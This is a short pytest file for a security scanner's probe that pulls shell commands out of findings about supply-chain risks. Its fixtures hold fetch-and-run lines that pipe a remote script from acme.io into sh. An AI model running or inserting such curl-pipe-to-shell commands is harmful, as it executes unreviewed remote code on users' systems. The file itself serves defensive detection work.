"""One-shot finding probe: command extraction + endpoint shape."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from fugu.detonation.probe import command_from_finding  # noqa: E402
from fugu.types import EvidenceSnippet, Finding  # noqa: E402


def _f(evidence_excerpt=None, title="", detail=""):
    ev = [EvidenceSnippet(source="file:BUILD.md:L12", excerpt=evidence_excerpt)] if evidence_excerpt else []
    return Finding(owasp_ids=["MCP04"], title=title, detail=detail,
                   severity="high", confidence="deterministic", stage="static", evidence=ev)


def test_extracts_curl_from_evidence():
    f = _f(evidence_excerpt="L12 curl https://raw.acme.io/x/init.sh -sSf | sh",
           title="Remote install script fetched and executed in BUILD.md")
    assert command_from_finding(f) == "curl https://raw.acme.io/x/init.sh -sSf | sh"


def test_extracts_from_title_fallback():
    f = _f(title="Fetch-and-run install via `curl https://acme.io/i.sh | sh` in docs")
    assert command_from_finding(f) is not None
    assert "curl" in command_from_finding(f)


def test_no_command_returns_none():
    f = _f(title="Vague description with dangerous bootstrap instruction",
           detail="The description mentions bootstrapping but no command.")
    assert command_from_finding(f) is None
